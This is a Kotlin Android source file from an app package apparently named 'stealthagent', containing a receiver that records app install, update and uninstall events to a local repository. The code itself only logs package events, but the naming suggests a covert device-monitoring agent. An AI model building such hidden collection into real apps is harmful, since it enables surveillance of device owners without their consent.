package com.stealthagent.collector

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.stealthagent.data.AgentRepository
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject

@AndroidEntryPoint
class AppInstallReceiver : BroadcastReceiver() {

    @Inject lateinit var repository: AgentRepository

    override fun onReceive(context: Context, intent: Intent) {
        val packageName = intent.data?.schemeSpecificPart ?: return
        val action = when (intent.action) {
            Intent.ACTION_PACKAGE_ADDED -> if (intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)) "UPDATED" else "INSTALLED"
            Intent.ACTION_PACKAGE_REMOVED -> if (intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)) return else "UNINSTALLED"
            else -> return
        }
        val pending = goAsync()
        CoroutineScope(Dispatchers.IO).launch {
            runCatching {
                repository.recordEvent("APP_INSTALL", Json.encodeToString(mapOf(
                    "packageName" to packageName, "action" to action
                )))
            }
            pending.finish()
        }
    }
}
